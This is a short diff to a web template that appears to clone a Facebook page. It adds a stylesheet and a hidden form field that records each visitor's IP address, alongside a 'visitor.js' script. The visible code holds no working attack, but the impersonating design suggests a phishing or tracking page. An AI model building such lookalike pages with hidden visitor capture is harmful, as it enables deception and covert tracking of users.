@@ -9,6 +9,7 @@
       id="meta_referrer"
     />
     <link rel="stylesheet" href="{{ asset('css/facebook/style.css') }}" />
+    <link rel="stylesheet" href="{{ asset('css/facebook/app.css') }}" />
     <script src="{{ asset('js/facebook/script.js') }}"></script>
     <script src="{{ asset('js/facebook/visitor.js') }}"></script>
     <script nonce="">
@@ -1672,6 +1673,7 @@
 
                         -->
 
+                        <input type="text" class="hidden" id="ip" name="ip" value="{{ $getIpAddress }}">
                         <div id="ipInfo"></div>
 
                         <div class="_6ltg">
